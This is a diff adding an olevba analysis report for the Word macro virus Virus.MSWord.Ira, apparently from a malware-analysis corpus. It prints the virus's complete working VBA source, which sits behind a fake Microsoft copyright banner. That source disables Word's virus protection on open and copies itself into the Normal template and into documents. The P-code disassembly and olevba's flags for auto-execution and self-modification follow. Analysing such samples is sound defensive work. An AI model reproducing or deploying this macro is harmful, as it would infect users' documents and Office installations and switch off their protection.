@@ -1,0 +1,305 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Ira
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Ira - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' ------------------------------------------------------------------------
+'               Copyright (C) 2001 Microsoft Corporation
+'
+' You have a royalty-free right to use, modify, reproduce and distribute
+' the Sample Application Files (and/or any modified version) in any way
+' you find useful, provided that you agree that Microsoft has no warranty,
+' obligations or liability for any Sample Application Files.
+' ------------------------------------------------------------------------
+Private Sub Document_Open()
+On Error Resume Next
+Dim Temp, Body As String
+Dim ADocument, NTemplate As Object
+Dim AFlag, NFlag As Boolean
+Const Length = 1799
+Set ADocument = ActiveDocument.VBProject.VBComponents.Item(1)
+Set NTemplate = NormalTemplate.VBProject.VBComponents.Item(1)
+ AFlag = True
+ NFlag = True
+ Options.VirusProtection = Not AFlag
+ If NTemplate.CodeModule.CountOfLines <> 0 Then
+  Temp = NTemplate.CodeModule.Lines(1, NTemplate.CodeModule.CountOfLines)
+ End If
+ If InStr(Temp, "' " + String(72, "-")) = 0 Then
+  If InStr(Temp, "Document_Open") = 0 Then NFlag = False
+ Else
+  Body = Temp: Temp = ""
+ End If
+ If ADocument.CodeModule.CountOfLines <> 0 Then
+  Temp = ADocument.CodeModule.Lines(1, ADocument.CodeModule.CountOfLines)
+ End If
+ If InStr(Temp, "' " + String(72, "-")) = 0 Then
+  If InStr(Temp, "Document_Open") = 0 Then AFlag = False
+ Else
+  Body = Temp: Temp = ""
+ End If
+ Body = Mid$(Body, InStr(Body, "' " + String(72, "-")), Length)
+ If NFlag = False Then
+  NTemplate.CodeModule.InsertLines 1, Body
+  NormalTemplate.Save
+ End If
+ If Day(Date) = 20 And Month(Date) = 7 Then MsgBox "Ира !!! С днем рождения !!!", vbExclamation, "ViRUS"
+ If AFlag = False Then
+  ADocument.CodeModule.InsertLines 1, Body
+  ActiveDocument.Save
+ End If
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: Virus.MSWord.Ira
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 3981 bytes
+' Line #0:
+' 	QuoteRem 0x0000 0x0049 " ------------------------------------------------------------------------"
+' Line #1:
+' 	QuoteRem 0x0000 0x0037 "               Copyright (C) 2001 Microsoft Corporation"
+' Line #2:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #3:
+' 	QuoteRem 0x0000 0x0047 " You have a royalty-free right to use, modify, reproduce and distribute"
+' Line #4:
+' 	QuoteRem 0x0000 0x0046 " the Sample Application Files (and/or any modified version) in any way"
+' Line #5:
+' 	QuoteRem 0x0000 0x0049 " you find useful, provided that you agree that Microsoft has no warranty,"
+' Line #6:
+' 	QuoteRem 0x0000 0x003B " obligations or liability for any Sample Application Files."
+' Line #7:
+' 	QuoteRem 0x0000 0x0049 " ------------------------------------------------------------------------"
+' Line #8:
+' 	FuncDefn (Private Sub Document_Open())
+' Line #9:
+' 	OnError (Resume Next) 
+' Line #10:
+' 	Dim 
+' 	VarDefn Temp
+' 	VarDefn Body (As String)
+' Line #11:
+' 	Dim 
+' 	VarDefn ADocument
+' 	VarDefn NTemplate (As Object)
+' Line #12:
+' 	Dim 
+' 	VarDefn AFlag
+' 	VarDefn NFlag (As Boolean)
+' Line #13:
+' 	Dim (Const) 
+' 	LitDI2 0x0707 
+' 	VarDefn Length
+' Line #14:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set ADocument 
+' Line #15:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set NTemplate 
+' Line #16:
+' 	LitVarSpecial (True)
+' 	St AFlag 
+' Line #17:
+' 	LitVarSpecial (True)
+' 	St NFlag 
+' Line #18:
+' 	Ld AFlag 
+' 	Not 
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #19:
+' 	Ld NTemplate 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	LitDI2 0x0000 
+' 	Ne 
+' 	IfBlock 
+' Line #20:
+' 	LitDI2 0x0001 
+' 	Ld NTemplate 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld NTemplate 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St Temp 
+' Line #21:
+' 	EndIfBlock 
+' Line #22:
+' 	Ld Temp 
+' 	LitStr 0x0002 "' "
+' 	LitDI2 0x0048 
+' 	LitStr 0x0001 "-"
+' 	ArgsLd String$ 0x0002 
+' 	Add 
+' 	FnInStr 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	IfBlock 
+' Line #23:
+' 	Ld Temp 
+' 	LitStr 0x000D "Document_Open"
+' 	FnInStr 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (False)
+' 	St NFlag 
+' 	EndIf 
+' Line #24:
+' 	ElseBlock 
+' Line #25:
+' 	Ld Temp 
+' 	St Body 
+' 	BoS 0x0000 
+' 	LitStr 0x0000 ""
+' 	St Temp 
+' Line #26:
+' 	EndIfBlock 
+' Line #27:
+' 	Ld ADocument 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	LitDI2 0x0000 
+' 	Ne 
+' 	IfBlock 
+' Line #28:
+' 	LitDI2 0x0001 
+' 	Ld ADocument 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld ADocument 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St Temp 
+' Line #29:
+' 	EndIfBlock 
+' Line #30:
+' 	Ld Temp 
+' 	LitStr 0x0002 "' "
+' 	LitDI2 0x0048 
+' 	LitStr 0x0001 "-"
+' 	ArgsLd String$ 0x0002 
+' 	Add 
+' 	FnInStr 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	IfBlock 
+' Line #31:
+' 	Ld Temp 
+' 	LitStr 0x000D "Document_Open"
+' 	FnInStr 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (False)
+' 	St AFlag 
+' 	EndIf 
+' Line #32:
+' 	ElseBlock 
+' Line #33:
+' 	Ld Temp 
+' 	St Body 
+' 	BoS 0x0000 
+' 	LitStr 0x0000 ""
+' 	St Temp 
+' Line #34:
+' 	EndIfBlock 
+' Line #35:
+' 	Ld Body 
+' 	Ld Body 
+' 	LitStr 0x0002 "' "
+' 	LitDI2 0x0048 
+' 	LitStr 0x0001 "-"
+' 	ArgsLd String$ 0x0002 
+' 	Add 
+' 	FnInStr 
+' 	Ld Length 
+' 	ArgsLd Mid$$ 0x0003 
+' 	St Body 
+' Line #36:
+' 	Ld NFlag 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #37:
+' 	LitDI2 0x0001 
+' 	Ld Body 
+' 	Ld NTemplate 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #38:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #39:
+' 	EndIfBlock 
+' Line #40:
+' 	Ld Date 
+' 	ArgsLd Day 0x0001 
+' 	LitDI2 0x0014 
+' 	Eq 
+' 	Ld Date 
+' 	ArgsLd Month 0x0001 
+' 	LitDI2 0x0007 
+' 	Eq 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x001B "Ира !!! С днем рождения !!!"
+' 	Ld vbExclamation 
+' 	LitStr 0x0005 "ViRUS"
+' 	ArgsCall MsgBox 0x0003 
+' 	EndIf 
+' Line #41:
+' 	Ld AFlag 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #42:
+' 	LitDI2 0x0001 
+' 	Ld Body 
+' 	Ld ADocument 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #43:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #44:
+' 	EndIfBlock 
+' Line #45:
+' 	EndSub 
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
